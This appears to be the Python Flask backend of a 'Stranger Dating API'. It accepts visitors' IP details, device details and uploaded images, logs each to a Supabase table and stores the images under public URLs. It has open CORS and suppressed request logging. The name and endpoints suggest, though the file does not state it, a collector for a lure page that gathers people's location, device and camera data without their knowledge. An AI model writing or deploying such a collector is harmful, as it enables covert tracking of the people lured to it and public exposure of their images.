from supabase import create_client
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from datetime import datetime
import os
import logging
from werkzeug.utils import secure_filename

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
STORAGE_BUCKET = "images"
MAX_FILE_SIZE = 5 * 1024 * 1024
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "webp"}

if not SUPABASE_URL or not SUPABASE_KEY:
    raise ValueError("Missing SUPABASE_URL or SUPABASE_SERVICE_KEY")

app = Flask(__name__)
CORS(app)
app.config["MAX_CONTENT_LENGTH"] = MAX_FILE_SIZE

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

def check_supabase_connection():
    try:
        supabase.table("logs").select("*").limit(1).execute()
        return True
    except:
        return False

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

def save_to_db(payload):
    try:
        supabase.table("logs").insert({
            "data": payload,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
    except Exception as e:
        logging.error(f"DB Save Error: {e}")

@app.route("/")
def index():
    return jsonify({"message": "?? Stranger Dating API - FULL ENDPOINTS LIVE!", "supabase": check_supabase_connection()})

@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "healthy"}), 200

@app.route("/api/ipinfo", methods=["POST"])
def ipinfo():
    try:
        iplogs = request.json
        save_to_db({"type": "ipinfo", "data": iplogs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/device-info", methods=["POST"])
def device_info():
    try:
        logs = request.json
        save_to_db({"type": "deviceinfo", "data": logs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/upload-image", methods=["POST"])
def upload_image():
    try:
        image = request.files.get("image")
        if not image or not allowed_file(image.filename):
            return jsonify({"error": "Invalid image"}), 400
        
        filename = f"{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}.jpg"
        file_bytes = image.read()
        
        supabase.storage.from_(STORAGE_BUCKET).upload(filename, file_bytes)
        public_url = supabase.storage.from_(STORAGE_BUCKET).get_public_url(filename)
        
        save_to_db({"type": "image", "filename": filename, "url": public_url})
        return jsonify({"status": "success", "url": public_url}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/favicon.ico', methods=['GET'])
def favicon():
    return '', 204

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port, debug=False)
